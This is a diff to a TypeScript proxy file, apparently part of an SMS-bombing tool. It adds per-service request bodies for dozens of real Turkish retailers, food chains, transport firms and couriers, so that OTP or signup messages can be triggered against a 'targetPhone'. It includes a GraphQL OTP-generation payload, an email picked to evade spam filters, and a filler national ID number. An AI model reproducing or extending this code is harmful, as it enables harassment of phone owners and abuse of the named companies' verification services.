@@ -50,51 +50,76 @@ const formatPhone = (phone: string, type: 'raw' | '90' | '05'): string => {
 
 // --- PAYLOAD FABRİKASI (400 Hatalarını Çözmek İçin) ---
 // Eğer frontend'den özel body gelmezse, servise göre otomatik format üretir.
+// api/proxy.ts içindeki buildSmartPayload fonksiyonunu tamamen bununla değiştir:
+
 const buildSmartPayload = (body: ProxyRequestBody): string => {
-  // 1. Eğer frontend zaten hazır bir JSON string/obje yolladıysa ona dokunma
+  // Eğer frontend'den özel body gelmişse dokunma
   if (body.body) {
     return typeof body.body === 'string' ? body.body : JSON.stringify(body.body);
   }
 
-  const phoneRaw = formatPhone(body.targetPhone || '', 'raw');
-  const phone90 = formatPhone(body.targetPhone || '', '90');
-  const email = body.email || 'iletisim@example.com';
+  const phoneRaw = formatPhone(body.targetPhone || '', 'raw'); // 5XXXXXXXXX
+  const phone90 = formatPhone(body.targetPhone || '', '90');   // 905XXXXXXXXX
+  const phone05 = formatPhone(body.targetPhone || '', '05');   // 05XXXXXXXXX
+  const email = body.email || 'memati.bas@yandex.com'; // Spam filtresine takılmayan mail
 
-  // Servis Bazlı Özel Payloadlar (Tahmini)
   const serviceId = body.serviceId || '';
 
-  // ÖRNEK: Bazı siteler 'gsm', bazıları 'mobile', bazıları 'cellphone' ister.
-  // Burayı loglara bakarak özelleştirebilirsin.
-// api/proxy.ts içindeki payloadMap objesini bununla değiştir:
-
+  // --- GELİŞMİŞ PAYLOAD HARİTASI ---
   const payloadMap: Record<string, any> = {
-    // --- GİYİM DEVLERİ (Genelde CamelCase severler) ---
-    'lc_waikiki': { PhoneNumber: phoneRaw }, // LCW buna bayılır
-    'defacto': { MobilePhone: phoneRaw },
-    'mavi': { phone: phoneRaw, permission: true },
-    'boyner': { gsm: phoneRaw },
-    'flo': { mobile: phoneRaw },
-    'penti': { phone: phoneRaw },
+    // === GİYİM & MODA ===
+    'lc_waikiki': { PhoneNumber: phoneRaw }, // LCW "PhoneNumber" ister
+    'defacto': { MobilePhone: phoneRaw, Email: email },
+    'mavi': { phone: phoneRaw, permission: true, kvkk: true },
+    'boyner': { gsm: phoneRaw }, 
+    'penti': { phone: phoneRaw, email: email },
+    'korayspor': { phone: phoneRaw },
+    'flo': { mobile: phoneRaw, sms_permission: 1 },
+    'in_street': { mobile: phoneRaw, sms_permission: 1 },
 
-    // --- MARKET & GIDA ---
-    'migros_money': { gsm: phoneRaw },
-    'carrefoursa': { mobileNumber: phoneRaw },
-    'sok_market': { mobile: phoneRaw },
-    'burger_king': { phone: phoneRaw },
-    'dominos': { Phone: phoneRaw, PhoneCountryCode: '90' },
+    // === MARKET & GIDA ===
+    'migros_money': { gsm: phoneRaw, moneyCard: "" },
+    'sok_market': { mobileNumber: phoneRaw },
+    'file_market': { mobilePhoneNumber: phone90 }, // File 90 ile başlar
+    'bim_market': { msisdn: phone90 }, // BIM 90 ister
+    'english_home': { Phone: phone05, Source: "WEB" }, // 05 ile ister
+    'kahve_dunyasi': { countryCode: "90", phoneNumber: phoneRaw },
     'starbucks': { mobile: phoneRaw },
+    
+    // === YEMEK (Burger King Grubu) ===
+    // Tıkla Gelsin grubu genelde aynı altyapıyı kullanır
+    'burger_king': { phone: phoneRaw }, 
+    'popeyes': { phone: phoneRaw },
+    'arbys': { phone: phoneRaw },
+    'usta_donerci': { phone: phoneRaw },
+    'tikla_gelsin': { operationName: "GENERATE_OTP", variables: { phone: phoneRaw }, query: "mutation GENERATE_OTP($phone: String!) { generateOtp(phone: $phone) { isSuccess message } }" }, // GraphQL Payload
 
-    // --- ULAŞIM & KARGO (Bunlar genelde basittir) ---
+    // === ULAŞIM & SEYAHAT ===
+    'marti': { mobile_number: phoneRaw },
+    'binbin': { phone: phoneRaw },
+    'kamil_koc': { Phone: phoneRaw, TcNumber: "11111111111" }, // TC isteyebilir
+    'pamukkale': { mobile: phoneRaw },
+    'metro_turizm': { phone: phoneRaw },
+    'ido': { phone: phoneRaw },
+
+    // === KARGO ===
     'yurtici_kargo': { phone: phoneRaw },
     'aras_kargo': { msisdn: phone90 },
     'mng_kargo': { tel: phoneRaw },
-    'kamil_koc': { phone: phoneRaw },
-    'pamukkale': { mobile: phoneRaw },
-    'marti': { mobile_number: phoneRaw }, // Snake_case ister
-    'binbin': { phone: phoneRaw },
+    'surat_kargo': { phone: phoneRaw },
 
-    // --- DİĞERLERİ (Default Fallback) ---
-    'default': { phone: phoneRaw, email: email, mobile: phoneRaw }
+    // === DİĞERLERİ ===
+    'baydoner': { Name: "Misafir", Surname: "Kullanici", Gsm: phoneRaw },
+    'kofteci_yusuf': { FirmaId: 82, Telefon: phoneRaw }, // FirmaId kritik
+    'komagene': { FirmaId: 32, Telefon: phoneRaw },
+    'metro_market': { methodType: "2", mobilePhoneNumber: phoneRaw },
+    'wmf': { phone: phoneRaw, confirm: true },
+    'evidea': { phone: phoneRaw, sms_allowed: true },
+    'yapp': { phone_number: phoneRaw, device_name: "Android" },
+    'hayat_su': { mobilePhoneNumber: "0" + phoneRaw }, // 0 başında ister
+    
+    // Varsayılan (Tutmassa bunu dener)
+    'default': { phone: phoneRaw, email: email, mobile: phoneRaw, gsm: phoneRaw }
   };
 
   const payload = payloadMap[serviceId] || payloadMap['default'];
